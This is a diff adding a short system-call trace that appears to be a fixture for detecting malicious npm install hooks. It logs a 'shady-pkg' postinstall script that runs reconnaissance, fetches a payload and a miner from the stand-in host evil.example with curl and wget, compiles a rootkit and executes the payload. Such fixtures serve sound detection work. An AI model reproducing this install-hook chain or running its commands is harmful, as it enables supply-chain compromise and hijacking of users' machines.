@@ -1,0 +1,9 @@
+7001  execve("/usr/bin/node", ["node", "/sandbox/node_modules/shady-pkg/postinstall.js"], 0x7ffd5e8e7e60 /* 10 vars */) = 0
+7001  execve("/bin/sh", ["sh", "-c", "whoami && uname -a"], 0x7ffd5e8e7e60 /* 10 vars */) = 0
+7001  execve("/usr/bin/whoami", ["whoami"], 0x7ffd5e8e7e60 /* 10 vars */) = 0
+7001  execve("/usr/bin/curl", ["curl", "-s", "http://evil.example/payload.sh"], 0x7ffd5e8e7e60 /* 10 vars */) = 0
+7001  execve("/usr/bin/wget", ["wget", "-q", "http://evil.example/miner", "-O", "/tmp/miner"], 0x7ffd5e8e7e60 /* 10 vars */) = 0
+7001  execve("/usr/bin/python3", ["python3", "-c", "import socket; s=socket.socket()"], 0x7ffd5e8e7e60 /* 10 vars */) = 0
+7001  execve("/usr/bin/cc", ["cc", "-o", "/tmp/rootkit", "/tmp/rootkit.c"], 0x7ffd5e8e7e60 /* 10 vars */) = 0
+7001  execve("/usr/bin/chmod", ["chmod", "+x", "/tmp/miner"], 0x7ffd5e8e7e60 /* 10 vars */) = 0
+7001  execve("/bin/bash", ["bash", "/tmp/payload.sh"], 0x7ffd5e8e7e60 /* 10 vars */) = 0
